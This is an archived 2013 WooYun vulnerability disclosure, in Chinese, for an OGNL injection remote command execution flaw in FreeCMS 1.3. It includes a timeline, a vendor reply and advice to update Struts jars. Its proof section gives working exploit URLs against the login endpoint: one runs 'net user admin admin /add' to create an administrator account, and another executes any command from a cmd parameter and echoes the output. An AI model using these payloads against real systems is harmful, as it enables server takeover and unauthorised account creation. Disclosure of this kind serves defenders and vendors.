@@ -1,0 +1,247 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		FreeCms 命令执行(Ognl执行顺序绕过漏洞附EXP)  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		FreeCms 命令执行(Ognl执行顺序绕过漏洞附EXP)  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/园长">园长</a> 
+</li><li>提交时间：		2013-05-02 17:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-09：	细节向第三方安全合作伙伴开放<br/>
+									2013-05-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-05-26：	细节向普通白帽子公开<br/>
+									2013-06-15：	细节向实习白帽子公开<br/>
+									2013-07-31：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">今天iteye.com首页推荐的CMS，于是看了下。开源免费java CMS - FreeCMS1.3-数据对象-mail 项目地址：https://code.google.com/p/freecms/</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">开源免费java CMS - FreeCMS1.3-数据对象-mail <br />
+<br />
+项目地址：https://code.google.com/p/freecms/<br />
+<br />
+<br />
+<br />
+之前公布的EXP利用工具是不行的，不过可以用我之前发布的某工具执行命令，写shell。<br />
+<br />
+漏洞描述（看EXP3利用就行了）：<br />
+<br />
+</p><p class="detail"><a href="../images/0214594925c63dedd54088b76d1c95bd28a2b81f.jpg" target="_blank"><img src="../images/0214594925c63dedd54088b76d1c95bd28a2b81f.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">找到登录页面：http://localhost:8080/ff/login.jsp<br />
+<br />
+自行从源码里面获取表单参数，或用上面说的工具自动提取。<br />
+<br />
+然后修改提交的action：http://localhost:8080/ff/login_login.do?user.loginname=EXP<br />
+<br />
+<br />
+<br />
+选择类型为String的请求就行了<br />
+<br />
+</p><p class="detail"><a href="../images/02150336bb39f9897e830493a7471278b5f13c41.jpg" target="_blank"><img src="../images/02150336bb39f9897e830493a7471278b5f13c41.jpg" alt="33.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+添加帐号：http://localhost:8080/ff/login_login.do?user.loginname=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec(&#039;net user admin admin /add%27%29%29%28meh%29&amp;z[%28user.loginname%29%28%27meh%27%29]=true<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/021500350586db98097f962955557ce325982f98.jpg" target="_blank"><img src="../images/021500350586db98097f962955557ce325982f98.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+有人说命令执行呢？哪里？呵呵，改改之前的EXP不就解决了：<br />
+<br />
+<br />
+<br />
+http://localhost:8080/ff/login_login.do?user.loginname=(<br />
+<br />
+%23context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false),<br />
+<br />
+%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=new java.lang.Boolean(true),<br />
+<br />
+%23req=@org.apache.struts2.ServletActionContext@getRequest(),<br />
+<br />
+%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),<br />
+<br />
+%23iswinreader=new java.io.DataInputStream(%23exec.getInputStream()),<br />
+<br />
+%23buffer=new byte[1000],<br />
+<br />
+%23iswinreader.readFully(%23buffer),<br />
+<br />
+%23result=new java.lang.String(%23buffer),<br />
+<br />
+%23response=@org.apache.struts2.ServletActionContext@getResponse(),<br />
+<br />
+%23response.getWriter().println(%23result)<br />
+<br />
+)<br />
+<br />
+&amp;z[(user.loginname)(&#039;meh&#039;)]=true&amp;cmd=cmd /c set<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/02151027661cc7e3f90ef890cc1763accf711585.jpg" target="_blank"><img src="../images/02151027661cc7e3f90ef890cc1763accf711585.jpg" alt="5555.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">更新apache官方最新版本jar包 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/园长" title="园长">园长</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-022939" title="FreeCms 命令执行(Ognl执行顺序绕过漏洞附EXP)">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：18 </p>
+													<p class="detail">确认时间：2013-05-06 22:30</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">这个案例是主要是学习新的exp的过程，对于freecms的应用特征，至6日未在国内测试得到互联网上的案例情况。如果白帽子对此有研究心得，可以不吝赐教，以便CNVD尽快定位国内用户情况。<br />
+<br />
+rank 18</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="22939";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
